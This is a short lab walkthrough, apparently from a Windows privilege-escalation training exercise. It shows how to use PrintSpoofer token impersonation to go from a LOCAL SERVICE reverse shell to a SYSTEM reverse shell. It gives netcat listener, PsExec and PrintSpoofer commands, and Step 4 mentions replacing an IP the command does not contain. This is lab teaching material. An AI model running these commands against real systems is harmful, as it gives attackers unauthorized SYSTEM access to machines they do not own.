# 🐾 17. Token Impersonation - PrintSpoofer

## 📜 Task Description
In this task, we will use the PrintSpoofer exploit to escalate privileges to `SYSTEM` using token impersonation. We will first gain a shell with the `LOCAL SERVICE` account privileges, and then use PrintSpoofer to escalate privileges to `SYSTEM`.

---

## 🔍 Step 1: Set up a listener on Kali
First, we need to set up a listener on Kali to wait for connections from the target machine. Run the following command on Kali:

'`sudo nc -lvnp 53`'

---

## 🔑 Step 2: Obtain a shell with `LOCAL SERVICE` account privileges
Log in to the system via RDP as an administrator. Open a command prompt with administrator rights (right-click -> "Run as administrator"). Then, use `PSExec64.exe` to run `reverse.exe` with `LOCAL SERVICE` account privileges:

'`C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe`'

After executing this, you should receive the first reverse shell with `LOCAL SERVICE` privileges on Kali.

---

## 📝 Step 3: Set up a second listener on Kali
Next, set up a second listener on Kali to listen for the second reverse shell with `SYSTEM` privileges:

'`sudo nc -lvnp <port>`'

---

## 🎯 Step 4: Run the PrintSpoofer exploit
In the reverse shell running with `LOCAL SERVICE` privileges, run the PrintSpoofer exploit to escalate privileges to `SYSTEM`. Replace the IP address with your Kali IP:

'`C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i`'

This step should create the second reverse shell with `SYSTEM` privileges, which will connect to the listener on Kali.
